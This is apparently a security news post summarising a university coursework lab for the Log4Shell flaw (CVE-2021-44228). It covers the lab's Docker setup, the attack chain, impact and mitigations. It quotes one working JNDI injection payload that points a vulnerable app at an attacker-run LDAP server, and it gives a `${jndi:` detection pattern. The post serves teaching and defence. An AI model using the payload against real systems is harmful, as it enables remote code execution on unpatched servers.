---
title: "Log4J-PoC — TPAS Log4Shell Lab Stack"
slug: "log4j-poc-tpas-lab"
date: 2026-06-29
type: news
category: news
tags: [log4j, log4shell, cve-2021-44228, java, sploitus]
excerpt: "TPAS coursework repo: React storefront + vulnerable Log4j 2.14 Spring API + JNDI exploit script with WAF-bypass toggle."
source: "Sploitus"
sourceUrl: "https://sploitus.com/exploit?id=40E52223-C309-5E07-BDDC-2B93D5BCEEEB"
draft: false
---

## Summary

[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) (Log4Shell) remains a critical (**CVSS 10.0**) JNDI injection flaw in Apache Log4j **2.0-beta9 – 2.14.1** — not a 2026 zero-day, but still widely scanned.

[DarianRa/Log4J-PoC](https://github.com/DarianRa/Log4J-PoC) is a Docker-compose Spring Boot shopping-list lab on **Log4j 2.14.1** with LDAP/HTTP marshalsec chain and reverse-shell proof demonstrating the classic exploit chain.

## Key Findings

| Finding | Detail |
|---------|--------|
| CVE | CVE-2021-44228 (Log4Shell) + related 2021 chain CVEs |
| Component | Apache Log4j 2.0-beta9 – 2.14.1 |
| Lab trigger | `${jndi:ldap://ldap-server:1389/EvilMalware}` in shopping-list item field |
| Architecture | Docker bridge: vulnerable-app :8080, ldap-server :1389, http-server :8000, attacker-listener :4444 |
| Secondary card | TPAS React + Spring Log4j 2.14 stack ([610F8853](https://sploitus.com/exploit?id=610F8853-5D6B-5E0E-AE66-904F64A7C2CE)) with WAF-bypass toggle |
| Intent | Hochschule Bonn-Rhein-Sieg *Secure Software Testing* lab / authorized use |

## Attack Chain

```text
Attacker LDAP/RMI server (init.sh) ← JNDI lookup from logged user input
        ↓
Log4j loads remote Java class
        ↓
RCE on Spring Boot host running vulnerable log4j-core
```

## Impact

Legacy Log4j remains a high-value scanner target. Sploitus surfacing Log4J-PoC repos accelerates **mass JNDI injection attempts** against lagging Java estates — impact is full server compromise where patches were never applied.

## Mitigation

1. Upgrade Log4j to **2.17.1+** (or supported vendor-patched line).
2. Remove JndiLookup class only as emergency triage, not sole long-term control.
3. Block outbound LDAP/RMI from app subnets; monitor for `${jndi:` patterns.

## Related Signals

- [TLS1.2 exploit lab](/signals/tls12-exploit-scripts-pen-test-lab)
- [Exploitarium collection](/signals/exploitarium-poc-collection)

## Sources

- [Sploitus — DarianRa/Log4J-PoC](https://sploitus.com/exploit?id=40E52223-C309-5E07-BDDC-2B93D5BCEEEB)
- [GitHub — DarianRa/Log4J-PoC](https://github.com/DarianRa/Log4J-PoC)
- [Sploitus — TPAS Log4Shell PoC (secondary)](https://sploitus.com/exploit?id=610F8853-5D6B-5E0E-AE66-904F64A7C2CE)
- [GitHub — bogdanspbm/log4j-pocs](https://github.com/bogdanspbm/log4j-pocs)
- [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)